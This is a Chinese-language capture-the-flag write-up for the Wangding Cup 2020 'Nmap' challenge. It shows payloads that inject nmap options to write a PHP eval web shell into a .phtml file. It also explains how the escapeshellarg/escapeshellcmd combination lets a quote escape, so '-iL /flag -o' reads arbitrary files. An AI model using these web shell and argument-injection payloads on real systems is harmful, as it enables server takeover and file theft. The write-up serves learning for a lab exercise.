# [网鼎杯 2020 朱雀组]Nmap 通过nmap写入木马 argcmd过滤实现逃逸

这道题也很好玩 啊 原本以为是ssrf或者会不会是rce

结果是通过nmap写入木马

我们来玩一下

## 传入木马



<img src="https://i-blog.csdnimg.cn/blog_migrate/74e037ff932d968fbf1939af86a5637c.png" alt="" style="max-height:338px; box-sizing:content-box;" />


映入眼帘是nmap

我们首先就要了解nmap的指令

```diff
Nmap 相关参数
 
-iL 读取文件内容，以文件内容作为搜索目标
-o 输出到文件
 
    -oN 标准保存
    -oX XML保存
    -oG Grep保存
    -oA 保存到所有格式
```

我们将木马作为文件读取 然后输出到.php后缀中

```php
<?php @eval($_POST['attack']);?>  -oG hak.php
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/8fa6917dda9be61a66ac2290c5d83873.png" alt="" style="max-height:131px; box-sizing:content-box;" />


我们换短标签看看

```php
<? echo @eval($_POST['attack']); ?>  -oG hak.php
```

发现还不行 我们看看是不是php过滤了



<img src="https://i-blog.csdnimg.cn/blog_migrate/4ee3135a53c5daa61365046290879e38.png" alt="" style="max-height:424px; box-sizing:content-box;" />


果然 那我们使用其他的 例如phtml

```swift
'<? echo @eval($_POST["a"]);?> -oG hck.phtml '
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/8dd6f25f1506a4e8a90d8ed69b558415.png" alt="" style="max-height:134px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/646bd9354127bdc20da919b5a19680f8.png" alt="" style="max-height:143px; box-sizing:content-box;" />


## 任意文件读取

这里我不知道师傅们怎么知道存在 escapshellarg()和escapshellcmd()的

但是我们可以通过这两个来了解

### escapshellarg()

这个的操作比较多

对类似非法的 进行 加引号和转义符

例如

'  ---->  '\''

### escapshellcmd()

这个是对非法进行加转义符

' ----> \'

我们这里可以进行尝试

127.0.0.1' -iL /flag 1.txt

#### 通过arg过滤是

'127.0.0.1'\'' -iL /flag 1.txt'

#### 然后通过 cmd转义

这里会匹配\ 为非法 进行转义

'127.0.0.1'\\'' -iL /flag -o 1.txt'

那么这里 \\ '' 就会识别为\

所以简化就是

'127.0.0.1'\ -iL /flag -o1.txt'

从而爆出读取失败的值

```undefined
这里报错值的原理是
 
去访问 文件 使用参数 -iL 
然后 读取失败 就会将读取的值报错出来
```

然后我们访问1.txt' 记得后面有一个逃逸的单引号

```vbnet
127.0.0.1'\ -iL /flag -o1.txt
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/8877e04ec1962638fffeb0761005ffcc.png" alt="" style="max-height:194px; box-sizing:content-box;" />


就可以实现读取